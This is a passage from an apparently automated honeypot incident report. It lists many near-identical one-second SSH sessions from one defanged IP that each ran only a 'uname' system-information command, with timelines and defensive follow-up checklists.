|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:25` | `cowrie.session.connect` |
| `2026-08-08 07:02:25` | `cowrie.client.version` |
| `2026-08-08 07:02:25` | `cowrie.client.kex` |
| `2026-08-08 07:02:26` | `cowrie.login.success` |
| `2026-08-08 07:02:27` | `cowrie.session.params` |
| `2026-08-08 07:02:27` | `cowrie.command.input` |
| `2026-08-08 07:02:27` | `cowrie.log.closed` |
| `2026-08-08 07:02:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-607a709fb8a4

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:29` | `cowrie.session.connect` |
| `2026-08-08 07:02:29` | `cowrie.client.version` |
| `2026-08-08 07:02:29` | `cowrie.client.kex` |
| `2026-08-08 07:02:30` | `cowrie.login.success` |
| `2026-08-08 07:02:31` | `cowrie.session.params` |
| `2026-08-08 07:02:31` | `cowrie.command.input` |
| `2026-08-08 07:02:31` | `cowrie.log.closed` |
| `2026-08-08 07:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f43ae31ee54

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:33` | `cowrie.session.connect` |
| `2026-08-08 07:02:33` | `cowrie.client.version` |
| `2026-08-08 07:02:33` | `cowrie.client.kex` |
| `2026-08-08 07:02:34` | `cowrie.login.success` |
| `2026-08-08 07:02:35` | `cowrie.session.params` |
| `2026-08-08 07:02:35` | `cowrie.command.input` |
| `2026-08-08 07:02:35` | `cowrie.log.closed` |
| `2026-08-08 07:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61ec465dd68c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:37` | `cowrie.session.connect` |
| `2026-08-08 07:02:37` | `cowrie.client.version` |
| `2026-08-08 07:02:37` | `cowrie.client.kex` |
| `2026-08-08 07:02:38` | `cowrie.login.success` |
| `2026-08-08 07:02:39` | `cowrie.session.params` |
| `2026-08-08 07:02:39` | `cowrie.command.input` |
| `2026-08-08 07:02:39` | `cowrie.log.closed` |
| `2026-08-08 07:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a36006c68f44

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:41` | `cowrie.session.connect` |
| `2026-08-08 07:02:41` | `cowrie.client.version` |
| `2026-08-08 07:02:41` | `cowrie.client.kex` |
| `2026-08-08 07:02:42` | `cowrie.login.success` |
| `2026-08-08 07:02:43` | `cowrie.session.params` |
| `2026-08-08 07:02:43` | `cowrie.command.input` |
| `2026-08-08 07:02:43` | `cowrie.log.closed` |
| `2026-08-08 07:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7a28944cf69

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:45` | `cowrie.session.connect` |
| `2026-08-08 07:02:45` | `cowrie.client.version` |
| `2026-08-08 07:02:45` | `cowrie.client.kex` |
| `2026-08-08 07:02:46` | `cowrie.login.success` |
| `2026-08-08 07:02:47` | `cowrie.session.params` |
| `2026-08-08 07:02:47` | `cowrie.command.input` |
| `2026-08-08 07:02:47` | `cowrie.log.closed` |
| `2026-08-08 07:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba1f102c2ff4

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:50` | `cowrie.session.connect` |
| `2026-08-08 07:02:50` | `cowrie.client.version` |
| `2026-08-08 07:02:50` | `cowrie.client.kex` |
| `2026-08-08 07:02:50` | `cowrie.login.success` |
| `2026-08-08 07:02:51` | `cowrie.session.params` |
| `2026-08-08 07:02:51` | `cowrie.command.input` |
| `2026-08-08 07:02:51` | `cowrie.log.closed` |
| `2026-08-08 07:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20d5fb6279d4

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:54` | `cowrie.session.connect` |
| `2026-08-08 07:02:54` | `cowrie.client.version` |
| `2026-08-08 07:02:54` | `cowrie.client.kex` |
| `2026-08-08 07:02:54` | `cowrie.login.success` |
| `2026-08-08 07:02:55` | `cowrie.session.params` |
| `2026-08-08 07:02:55` | `cowrie.command.input` |
| `2026-08-08 07:02:55` | `cowrie.log.closed` |
| `2026-08-08 07:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a0e416449f0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:02 |
| **Last Seen** | 2026-08-08 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:02:58` | `cowrie.session.connect` |
| `2026-08-08 07:02:58` | `cowrie.client.version` |
| `2026-08-08 07:02:58` | `cowrie.client.kex` |
| `2026-08-08 07:02:58` | `cowrie.login.success` |
| `2026-08-08 07:02:59` | `cowrie.session.params` |
| `2026-08-08 07:02:59` | `cowrie.command.input` |
| `2026-08-08 07:02:59` | `cowrie.log.closed` |
| `2026-08-08 07:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbd6d83f5bba

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:03 |
| **Last Seen** | 2026-08-08 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:03:02` | `cowrie.session.connect` |
| `2026-08-08 07:03:02` | `cowrie.client.version` |
| `2026-08-08 07:03:02` | `cowrie.client.kex` |
| `2026-08-08 07:03:02` | `cowrie.login.success` |
| `2026-08-08 07:03:03` | `cowrie.session.params` |
| `2026-08-08 07:03:03` | `cowrie.command.input` |
| `2026-08-08 07:03:03` | `cowrie.log.closed` |
| `2026-08-08 07:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dee774290f6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:03 |
| **Last Seen** | 2026-08-08 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:03:06` | `cowrie.session.connect` |
| `2026-08-08 07:03:06` | `cowrie.client.version` |
| `2026-08-08 07:03:06` | `cowrie.client.kex` |
| `2026-08-08 07:03:06` | `cowrie.login.success` |
| `2026-08-08 07:03:07` | `cowrie.session.params` |
| `2026-08-08 07:03:07` | `cowrie.command.input` |
| `2026-08-08 07:03:07` | `cowrie.log.closed` |
| `2026-08-08 07:03:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a5ee4beb8ec

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:03 |
| **Last Seen** | 2026-08-08 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:03:10` | `cowrie.session.connect` |
| `2026-08-08 07:03:10` | `cowrie.client.version` |
| `2026-08-08 07:03:10` | `cowrie.client.kex` |
| `2026-08-08 07:03:11` | `cowrie.login.success` |
| `2026-08-08 07:03:11` | `cowrie.session.params` |
| `2026-08-08 07:03:11` | `cowrie.command.input` |
| `2026-08-08 07:03:12` | `cowrie.log.closed` |
| `2026-08-08 07:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-001b576a254e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:03 |
| **Last Seen** | 2026-08-08 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:03:14` | `cowrie.session.connect` |
| `2026-08-08 07:03:14` | `cowrie.client.version` |
| `2026-08-08 07:03:14` | `cowrie.client.kex` |
| `2026-08-08 07:03:15` | `cowrie.login.success` |
| `2026-08-08 07:03:15` | `cowrie.session.params` |
| `2026-08-08 07:03:15` | `cowrie.command.input` |
| `2026-08-08 07:03:16` | `cowrie.log.closed` |
| `2026-08-08 07:03:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f35e085c1ddf

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:03 |
| **Last Seen** | 2026-08-08 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:03:19` | `cowrie.session.connect` |
| `2026-08-08 07:03:19` | `cowrie.client.version` |
| `2026-08-08 07:03:19` | `cowrie.client.kex` |
| `2026-08-08 07:03:19` | `cowrie.login.success` |
| `2026-08-08 07:03:20` | `cowrie.session.params` |
| `2026-08-08 07:03:20` | `cowrie.command.input` |
| `2026-08-08 07:03:20` | `cowrie.log.closed` |
| `2026-08-08 07:03:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9abbbd972c0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:03 |
| **Last Seen** | 2026-08-08 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:03:22` | `cowrie.session.connect` |
| `2026-08-08 07:03:22` | `cowrie.client.version` |
| `2026-08-08 07:03:22` | `cowrie.client.kex` |
| `2026-08-08 07:03:23` | `cowrie.login.success` |
| `2026-08-08 07:03:24` | `cowrie.session.params` |
| `2026-08-08 07:03:24` | `cowrie.command.input` |
| `2026-08-08 07:03:24` | `cowrie.log.closed` |
| `2026-08-08 07:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ff9a34eb5a6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:03 |
| **Last Seen** | 2026-08-08 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:03:27` | `cowrie.session.connect` |
| `2026-08-08 07:03:27` | `cowrie.client.version` |
| `2026-08-08 07:03:27` | `cowrie.client.kex` |
| `2026-08-08 07:03:27` | `cowrie.login.success` |
| `2026-08-08 07:03:28` | `cowrie.session.params` |
| `2026-08-08 07:03:28` | `cowrie.command.input` |
| `2026-08-08 07:03:28` | `cowrie.log.closed` |
| `2026-08-08 07:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cb471d5a915

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:03 |
| **Last Seen** | 2026-08-08 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:03:31` | `cowrie.session.connect` |
| `2026-08-08 07:03:31` | `cowrie.client.version` |
| `2026-08-08 07:03:31` | `cowrie.client.kex` |
| `2026-08-08 07:03:31` | `cowrie.login.success` |
| `2026-08-08 07:03:32` | `cowrie.session.params` |
| `2026-08-08 07:03:32` | `cowrie.command.input` |
| `2026-08-08 07:03:32` | `cowrie.log.closed` |
| `2026-08-08 07:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26e78d1da61b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:03 |
| **Last Seen** | 2026-08-08 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:03:35` | `cowrie.session.connect` |
| `2026-08-08 07:03:35` | `cowrie.client.version` |
| `2026-08-08 07:03:35` | `cowrie.client.kex` |
| `2026-08-08 07:03:35` | `cowrie.login.success` |
| `2026-08-08 07:03:36` | `cowrie.session.params` |
| `2026-08-08 07:03:36` | `cowrie.command.input` |
| `2026-08-08 07:03:36` | `cowrie.log.closed` |
| `2026-08-08 07:03:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbb067ad6bc1

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:03 |
| **Last Seen** | 2026-08-08 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:03:39` | `cowrie.session.connect` |
| `2026-08-08 07:03:39` | `cowrie.client.version` |
| `2026-08-08 07:03:39` | `cowrie.client.kex` |
| `2026-08-08 07:03:39` | `cowrie.login.success` |
| `2026-08-08 07:03:40` | `cowrie.session.params` |
| `2026-08-08 07:03:40` | `cowrie.command.input` |
| `2026-08-08 07:03:40` | `cowrie.log.closed` |
| `2026-08-08 07:03:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca7d2b3f33a1

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:03 |
| **Last Seen** | 2026-08-08 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:03:43` | `cowrie.session.connect` |
| `2026-08-08 07:03:43` | `cowrie.client.version` |
| `2026-08-08 07:03:43` | `cowrie.client.kex` |
| `2026-08-08 07:03:43` | `cowrie.login.success` |
| `2026-08-08 07:03:44` | `cowrie.session.params` |
| `2026-08-08 07:03:44` | `cowrie.command.input` |
| `2026-08-08 07:03:44` | `cowrie.log.closed` |
| `2026-08-08 07:03:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd0bb980bbf

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:03 |
| **Last Seen** | 2026-08-08 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:03:47` | `cowrie.session.connect` |
| `2026-08-08 07:03:47` | `cowrie.client.version` |
| `2026-08-08 07:03:47` | `cowrie.client.kex` |
| `2026-08-08 07:03:47` | `cowrie.login.success` |
| `2026-08-08 07:03:48` | `cowrie.session.params` |
| `2026-08-08 07:03:48` | `cowrie.command.input` |
| `2026-08-08 07:03:48` | `cowrie.log.closed` |
| `2026-08-08 07:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-790a18cf2bb0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:03 |
| **Last Seen** | 2026-08-08 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:03:51` | `cowrie.session.connect` |
| `2026-08-08 07:03:51` | `cowrie.client.version` |
| `2026-08-08 07:03:51` | `cowrie.client.kex` |
| `2026-08-08 07:03:51` | `cowrie.login.success` |
| `2026-08-08 07:03:52` | `cowrie.session.params` |
| `2026-08-08 07:03:52` | `cowrie.command.input` |
| `2026-08-08 07:03:52` | `cowrie.log.closed` |
| `2026-08-08 07:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-728e66a3820b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:03 |
| **Last Seen** | 2026-08-08 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:03:55` | `cowrie.session.connect` |
| `2026-08-08 07:03:55` | `cowrie.client.version` |
| `2026-08-08 07:03:55` | `cowrie.client.kex` |
| `2026-08-08 07:03:55` | `cowrie.login.success` |
| `2026-08-08 07:03:56` | `cowrie.session.params` |
| `2026-08-08 07:03:56` | `cowrie.command.input` |
| `2026-08-08 07:03:56` | `cowrie.log.closed` |
| `2026-08-08 07:03:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1c2b7ad056c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:03 |
| **Last Seen** | 2026-08-08 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:03:59` | `cowrie.session.connect` |
| `2026-08-08 07:03:59` | `cowrie.client.version` |
| `2026-08-08 07:03:59` | `cowrie.client.kex` |
| `2026-08-08 07:03:59` | `cowrie.login.success` |
| `2026-08-08 07:04:00` | `cowrie.session.params` |
| `2026-08-08 07:04:00` | `cowrie.command.input` |
| `2026-08-08 07:04:00` | `cowrie.log.closed` |
| `2026-08-08 07:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1365e6560582

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:04 |
| **Last Seen** | 2026-08-08 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:04:03` | `cowrie.session.connect` |
| `2026-08-08 07:04:03` | `cowrie.client.version` |
| `2026-08-08 07:04:03` | `cowrie.client.kex` |
| `2026-08-08 07:04:03` | `cowrie.login.success` |
| `2026-08-08 07:04:04` | `cowrie.session.params` |
| `2026-08-08 07:04:04` | `cowrie.command.input` |
| `2026-08-08 07:04:04` | `cowrie.log.closed` |
| `2026-08-08 07:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48bef57e34a8

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:04 |
| **Last Seen** | 2026-08-08 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:04:07` | `cowrie.session.connect` |
| `2026-08-08 07:04:07` | `cowrie.client.version` |
| `2026-08-08 07:04:07` | `cowrie.client.kex` |
| `2026-08-08 07:04:08` | `cowrie.login.success` |
| `2026-08-08 07:04:08` | `cowrie.session.params` |
| `2026-08-08 07:04:08` | `cowrie.command.input` |
